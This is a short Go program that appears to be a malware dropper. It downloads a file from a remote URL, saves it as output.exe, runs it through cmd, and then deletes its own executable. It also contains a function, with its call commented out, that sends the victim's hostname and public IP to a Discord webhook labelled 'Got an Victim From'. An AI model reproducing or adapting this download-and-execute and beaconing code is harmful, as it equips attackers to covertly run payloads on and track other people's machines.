package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/gtuk/discordwebhook"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

type IP struct {
	Query string
}

func getit() string {
	req, err := http.Get("http://ip-api.com/json/")
	if err != nil {
		return err.Error()
	}
	defer req.Body.Close()

	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		return err.Error()
	}

	var ip IP
	json.Unmarshal(body, &ip)

	return ip.Query
}

func UserHomeDir() string {
	if runtime.GOOS == "windows" {
		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
		return home
	}
	return os.Getenv("HOME")
}

func data() {
	nm, _ := os.Hostname()
	var username = "Got an Victim From - "
	var content = "Machine Name : " + nm + "\n" +
		"IP Address : " + getit() + "\n"

	var rawDecodedText, err = base64.StdEncoding.DecodeString("PASTE UR BASE 64 ENCODED WEBHOOK HERE")

	message := discordwebhook.Message{
		Username: &username,
		Content:  &content,
	}

	err = discordwebhook.SendMessage(string(rawDecodedText), message)
	if err != nil {
		log.Fatal(err)
	}
}
func main() {
	//data()

	out, _ := os.Create("output.exe")
	defer out.Close()
	resp, _ := http.Get("https://the.earth.li/~sgtatham/putty/latest/w64/putty-64bit-0.77-installer.msi")
	defer resp.Body.Close()
	_, _ = io.Copy(out, resp.Body)
	time.Sleep(2 * time.Second)

	c := exec.Command("cmd", "/C", "start", UserHomeDir()+"\\"+"output.exe")
	if err := c.Run(); err != nil {
		fmt.Println("Error: ", err)
	}

	cmd := exec.Command("cmd.exe", "/c", "del "+os.Args[0])
	cmd.Start()

}
